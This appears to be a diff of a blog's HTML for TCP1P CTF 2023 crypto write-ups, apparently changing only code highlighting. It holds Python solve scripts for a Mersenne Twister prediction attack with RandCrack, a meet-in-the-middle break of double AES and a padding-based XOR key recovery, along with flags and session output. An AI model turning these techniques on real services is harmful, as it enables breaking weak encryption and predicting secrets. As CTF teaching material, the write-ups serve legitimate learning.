-    rand <span style="color:#f92672">=</span> rc<span style="color:#f92672">.</span>predict_getrandbits(len(buff)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
-    <span style="color:#66d9ef">return</span> xor(buff, l2b(rand))
-
-<span style="color:#75715e"># Read the content of the file &#39;flago_encrypted_content&#39;</span>
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flago_encrypted_content&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> file:
-    content <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
-
-<span style="color:#75715e"># Decrypt the content and print the XOR output</span>
-decrypted_content <span style="color:#f92672">=</span> encropt(content)
-
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flago.jpg&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> file:
-    file<span style="color:#f92672">.</span>write(decrypted_content)
-
-</code></pre></div><p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/flago.jpg?raw=true" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> randcrack <span style="color:#f92672">import</span> RandCrack
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long <span style="color:#66d9ef">as</span> b2l, long_to_bytes <span style="color:#66d9ef">as</span> l2b
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Base URL of the server</span>
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://ctf.tcp1p.com:54734/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a session to persist cookies and other session-based info</span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_zero_file</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create a 4-byte file containing only zero bytes</span>
+</span></span><span style="display:flex;"><span>    zero_file <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># POST request to the server</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>        BASE_URL,
+</span></span><span style="display:flex;"><span>        files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;file&#34;</span>: (<span style="color:#e6db74">&#34;zero.txt&#34;</span>, zero_file)}
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Return the content of the response, which should be the encrypted file data</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rc <span style="color:#f92672">=</span> RandCrack()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List to collect the downloaded data</span>
+</span></span><span style="display:flex;"><span>downloaded_data_list <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send 625 POST requests and collect the data</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">625</span>):
+</span></span><span style="display:flex;"><span>    downloaded_data_list<span style="color:#f92672">.</span>append(upload_zero_file())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the content from /flago</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(BASE_URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;flago&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flago_encrypted_content&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(response<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Submit the first 624 downloaded data to RandCrack</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> downloaded_data_list[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+</span></span><span style="display:flex;"><span>    number <span style="color:#f92672">=</span> b2l(data)
+</span></span><span style="display:flex;"><span>    rc<span style="color:#f92672">.</span>submit(number)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert the 625th downloaded data to a number and print it</span>
+</span></span><span style="display:flex;"><span>final_number <span style="color:#f92672">=</span> b2l(downloaded_data_list[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;625th POST request number:&#34;</span>, final_number)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Predict the next random number using RandCrack</span>
+</span></span><span style="display:flex;"><span>predicted_number <span style="color:#f92672">=</span> rc<span style="color:#f92672">.</span>predict_getrandbits(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Predicted random number:&#34;</span>, predicted_number)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># XOR and encryption functions</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(a, b):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([bytes([_a <span style="color:#f92672">^</span> _b]) <span style="color:#66d9ef">for</span> _a, _b <span style="color:#f92672">in</span> zip(a, b)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encropt</span>(buff):
+</span></span><span style="display:flex;"><span>    rand <span style="color:#f92672">=</span> rc<span style="color:#f92672">.</span>predict_getrandbits(len(buff)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> xor(buff, l2b(rand))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read the content of the file &#39;flago_encrypted_content&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flago_encrypted_content&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the content and print the XOR output</span>
+</span></span><span style="display:flex;"><span>decrypted_content <span style="color:#f92672">=</span> encropt(content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flago.jpg&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(decrypted_content)
+</span></span></code></pre></div><p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/flago.jpg?raw=true" alt=""></p>
 <p><strong><code>FLAG: TCP1P{life's_twisted_like_a_back_road_in_the_country}</code></strong></p>
 <h2 id="final-consensus">Final Consensus</h2>
 <p>(56 Solves, 100 Points)</p>
 <p>This challenge can be solved using the &ldquo;Meet in the Middle&rdquo; (MitM) attack, which is a cryptographic attack that works on double encryption schemes. Given a plaintext and its double encryption, the attacker first encrypts the plaintext with every possible key and stores the result. Then, for every possible key, the attacker decrypts the ciphertext. If a decrypted ciphertext matches an encrypted plaintext, the attacker has found a pair of keys that could have been used for the double encryption.</p>
 <p>Below is the script to solve the challenge</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
-<span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
-
-flag_enc_enc <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(input(<span style="color:#e6db74">&#34;Alice&#39;s flag&gt;&gt; &#34;</span>))
-
-<span style="color:#75715e"># The known ciphertext - plaintext pair</span>
-plaintext <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Steve&#39;s plain&gt;&gt; &#34;</span>)
-ciphertext <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(input(<span style="color:#e6db74">&#34;Steve&#39;s cipher&gt;&gt; &#34;</span>))
-
-<span style="color:#75715e"># All possible keys</span>
-keys <span style="color:#f92672">=</span> [(str(i)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)[:<span style="color:#ae81ff">16</span>]<span style="color:#f92672">.</span>encode() <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000000</span>)]
-
-<span style="color:#75715e"># Encrypt the plaintext with all possible keys for &#39;a&#39;</span>
-enc_mapping <span style="color:#f92672">=</span> {}
-<span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> keys:
-    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
-    ct <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(pad(plaintext<span style="color:#f92672">.</span>encode(), <span style="color:#ae81ff">16</span>))
-    enc_mapping[ct] <span style="color:#f92672">=</span> key
-
-<span style="color:#75715e"># Decrypt the ciphertext with all possible keys for &#39;b&#39; and look for a match</span>
-<span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> keys:
-    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
-    decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
-    <span style="color:#66d9ef">if</span> decrypted <span style="color:#f92672">in</span> enc_mapping:
-        a <span style="color:#f92672">=</span> enc_mapping[decrypted]
-        b <span style="color:#f92672">=</span> key
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found keys: a = </span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">, b = </span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-        <span style="color:#66d9ef">break</span>
-
-<span style="color:#75715e"># Double Decrypt flag</span>
-cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(b, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
-flag_enc <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(flag_enc_enc)
-cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(a, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
-flag <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(flag_enc)
-flag <span style="color:#f92672">=</span> unpad(cipher<span style="color:#f92672">.</span>decrypt(flag_enc), <span style="color:#ae81ff">16</span>)  <span style="color:#75715e"># Added unpad to get proper plaintext</span>
-print(flag<span style="color:#f92672">.</span>decode())
-
-</code></pre></div><pre tabindex="0"><code>$ nc ctf.tcp1p.com 35257
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag_enc_enc <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(input(<span style="color:#e6db74">&#34;Alice&#39;s flag&gt;&gt; &#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The known ciphertext - plaintext pair</span>
+</span></span><span style="display:flex;"><span>plaintext <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Steve&#39;s plain&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(input(<span style="color:#e6db74">&#34;Steve&#39;s cipher&gt;&gt; &#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># All possible keys</span>
+</span></span><span style="display:flex;"><span>keys <span style="color:#f92672">=</span> [(str(i)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)[:<span style="color:#ae81ff">16</span>]<span style="color:#f92672">.</span>encode() <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000000</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encrypt the plaintext with all possible keys for &#39;a&#39;</span>
+</span></span><span style="display:flex;"><span>enc_mapping <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> keys:
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>    ct <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(pad(plaintext<span style="color:#f92672">.</span>encode(), <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    enc_mapping[ct] <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the ciphertext with all possible keys for &#39;b&#39; and look for a match</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> keys:
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>    decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> decrypted <span style="color:#f92672">in</span> enc_mapping:
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> enc_mapping[decrypted]
+</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found keys: a = </span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">, b = </span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Double Decrypt flag</span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(b, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>flag_enc <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(flag_enc_enc)
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(a, mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(flag_enc)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> unpad(cipher<span style="color:#f92672">.</span>decrypt(flag_enc), <span style="color:#ae81ff">16</span>)  <span style="color:#75715e"># Added unpad to get proper plaintext</span>
+</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><pre tabindex="0"><code>$ nc ctf.tcp1p.com 35257
 Alice: My message 706ea4db75b90c37fdd6587ffd1a19f5837e5e2b5553048a76447e55b0dcc4be83e7fdb59df5c0b4cd9c176aaa9b8654ee18cfed4755d7f2f95f558c1728d429df9fcf671d218330ac138d7b2074e8f5
 Alice: Now give me yours!
 &gt;&gt; thanks
@@ -526,34 +529,34 @@ Steve:  594253657cdf5462675ad58c06b987bd
 Alice: Agree.
 
 $ python3 mitm.py
-Alice's flag&gt;&gt; 706ea4db75b90c37fdd6587ffd1a19f5837e5e2b5553048a76447e55b0dcc4be83e7fdb59df5c0b4cd9c176aaa9b8654ee18cfed4755d7f2f95f558c1728d429df9fcf671d218330ac138d7b2074e8f5
-Steve's plain&gt;&gt; thanks
-Steve's cipher&gt;&gt; 594253657cdf5462675ad58c06b987bd
-Found keys: a = b'4231464231464231', b = b'1843881843881843'
+Alice&#39;s flag&gt;&gt; 706ea4db75b90c37fdd6587ffd1a19f5837e5e2b5553048a76447e55b0dcc4be83e7fdb59df5c0b4cd9c176aaa9b8654ee18cfed4755d7f2f95f558c1728d429df9fcf671d218330ac138d7b2074e8f5
+Steve&#39;s plain&gt;&gt; thanks
+Steve&#39;s cipher&gt;&gt; 594253657cdf5462675ad58c06b987bd
+Found keys: a = b&#39;4231464231464231&#39;, b = b&#39;1843881843881843&#39;
 TCP1P{nothing_ever_lasts_forever_everybody_wants_to_rule_the_world}
 </code></pre><p><strong><code>FLAG: TCP1P{nothing_ever_lasts_forever_everybody_wants_to_rule_the_world}</code></strong></p>
 <h2 id="one-pad-time">One Pad Time</h2>
 <p>(67 Solves, 100 Points)</p>
 <p>Since the length of the key is 16 bytes, the key can only be retrieved if we XOR the last 16 bytes of the ct in output.txt against a 16-bytes pad. So, let us assume that the original ct (before XOR) was 256 bytes, and the pad is 16 bytes. Thr pad method follows the PKCS#7 padding scheme, which fills up the remaining block space with bytes that are equal to the number of padding bytes. By reversing the XOR and AES encryption, we can retrieve the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">5</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> xor
-
-In [<span style="color:#ae81ff">6</span>]: pad<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10</span><span style="color:#e6db74">&#39;</span>
-
-In [<span style="color:#ae81ff">7</span>]: ct <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h</span><span style="color:#ae81ff">\x08\xaf</span><span style="color:#e6db74">mDV</span><span style="color:#ae81ff">\xaa\xcd\xea\xe9</span><span style="color:#e6db74">C</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">7/</span><span style="color:#ae81ff">\x1f</span><span style="color:#e6db74">F</span><span style="color:#ae81ff">\xe2</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\xcb\xb0\x1d</span><span style="color:#e6db74"> F</span><span style="color:#ae81ff">\xcc\xe5\xa6\x9d</span><span style="color:#e6db74">TJ</span><span style="color:#ae81ff">\\\xd1\x90\xac\xe0\x1c\x89</span><span style="color:#e6db74">1}</span><span style="color:#ae81ff">\x83</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\x86\xee\xc4</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xa0\x18\xa8\x06\xea</span><span style="color:#e6db74">&#34;{|</span><span style="color:#ae81ff">\x0b\x92</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\x9a</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\x91\xc8\x19\xb7</span><span style="color:#e6db74">FK</span><span style="color:#ae81ff">\x01\xb5\xf9</span><span style="color:#e6db74">8</span><span style="color:#ae81ff">\x80\x9b</span><span style="color:#e6db74">R)2</span><span style="color:#ae81ff">\x84</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xb3</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\t\xd5\xe5\xf0</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\x83\xc6\x19\x82\r\x7f\xfa</span><span style="color:#e6db74">GF</span><span style="color:#ae81ff">\xdb\xcb\xab\xd5</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\x95\t\xdd\xb5</span><span style="color:#e6db74">E&gt;F</span><span style="color:#ae81ff">\xdd\xa9\xa6\x82\x86\xee</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\xd9\xcc\xaf\xce\xf0\&#39;\xb3\xf4</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xcf\xdb\xc8\xbd</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\x01\xd0</span><span style="color:#e6db74">,}]</span><span style="color:#ae81ff">\xd5</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xd3</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\xb0\xe7\xb4</span><span style="color:#e6db74">[4</span><span style="color:#ae81ff">\x8a\xa2</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\xa1</span><span style="color:#e6db74">TV</span><span style="color:#ae81ff">\xd1</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\x1f\xbd</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\xa2\\</span><span style="color:#e6db74">K</span><span style="color:#ae81ff">\x16</span><span style="color:#e6db74">I%</span><span style="color:#ae81ff">\xda</span><span style="color:#e6db74">L</span><span style="color:#ae81ff">\xc6\xfb\xb7</span><span style="color:#e6db74">f.</span><span style="color:#ae81ff">\x98\xc3\xf4</span><span style="color:#e6db74">J</span><span style="color:#ae81ff">\x1b\xe9</span><span style="color:#e6db74">TT</span><span style="color:#ae81ff">\x83</span><span style="color:#e6db74">-</span><span style="color:#ae81ff">\x98</span><span style="color:#e6db74">BO</span><span style="color:#ae81ff">\xb4\x00</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xb5</span><span style="color:#e6db74">w</span><span style="color:#ae81ff">\xcf</span><span style="color:#e6db74">7m</span><span style="color:#ae81ff">\xa1\xea\xa9\xf6\xa6\xee\x00</span><span style="color:#e6db74">Y</span><span style="color:#ae81ff">\xdf</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\xe3\xa3\xa2\x1f</span><span style="color:#e6db74">=.</span><span style="color:#ae81ff">\x85\x08</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">N</span><span style="color:#ae81ff">\xfb</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\x89\x8b</span><span style="color:#e6db74">B</span><span style="color:#ae81ff">\x7f\x94\x91</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\x10</span><span style="color:#e6db74">ep</span><span style="color:#ae81ff">\x9b\x06</span><span style="color:#e6db74">oz</span><span style="color:#ae81ff">\x87</span><span style="color:#e6db74">&amp;U]J</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">9</span><span style="color:#ae81ff">\x12</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\xce</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\xc8\xa8\xb4</span><span style="color:#e6db74">v</span><span style="color:#ae81ff">\xaf</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\xb1</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x8b\xf5\xfe\xf8\r\xa7</span><span style="color:#e6db74">:r</span><span style="color:#ae81ff">\xe8\xe0</span><span style="color:#e6db74">fvKN</span><span style="color:#ae81ff">\\\xea\xe0\xa1\xe3\x99\xcc\xfd\x1a\x99</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\x90\xdf</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xae\xad</span><span style="color:#e6db74">&#39;</span>
-
-In [<span style="color:#ae81ff">8</span>]: key<span style="color:#f92672">=</span>xor(ct[<span style="color:#ae81ff">256</span>:],pad)
-
-In [<span style="color:#ae81ff">9</span>]: ct_padded<span style="color:#f92672">=</span>xor(ct,key)
-
-In [<span style="color:#ae81ff">10</span>]: iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf5\x8e\x85</span><span style="color:#e6db74">ye</span><span style="color:#ae81ff">\xc8</span><span style="color:#e6db74">j(%</span><span style="color:#ae81ff">\xc4</span><span style="color:#e6db74">K</span><span style="color:#ae81ff">\xc1</span><span style="color:#e6db74">g#</span><span style="color:#ae81ff">\x86\x1a</span><span style="color:#e6db74">&#39;</span>
-
-In [<span style="color:#ae81ff">11</span>]: <span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
-
-In [<span style="color:#ae81ff">12</span>]: cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
-
-In [<span style="color:#ae81ff">13</span>]: cipher<span style="color:#f92672">.</span>decrypt(ct_padded)
-Out[<span style="color:#ae81ff">13</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;TCP1P{why_did_the_chicken_cross_the_road?To_ponder_the_meaning_of_life_on_the_other_side_only_to_realize_that_the_road_itself_was_an_arbitrary_construct_with_no_inherent_purpose_and_that_true_enlightenment_could_only_be_found_within_its_own_existence_1234}</span><span style="color:#ae81ff">\xba</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\xb9\x0c</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xc4</span><span style="color:#e6db74">R</span><span style="color:#ae81ff">\x95</span><span style="color:#e6db74">O</span><span style="color:#ae81ff">\r\x85\x18\t</span><span style="color:#e6db74">H#F&#39;</span>
-</code></pre></div><p><code>FLAG: TCP1P{why_did_the_chicken_cross_the_road?To_ponder_the_meaning_of_life_on_the_other_side_only_to_realize_that_the_road_itself_was_an_arbitrary_construct_with_no_inherent_purpose_and_that_true_enlightenment_could_only_be_found_within_its_own_existence_1234}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">5</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> xor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">6</span>]: pad<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
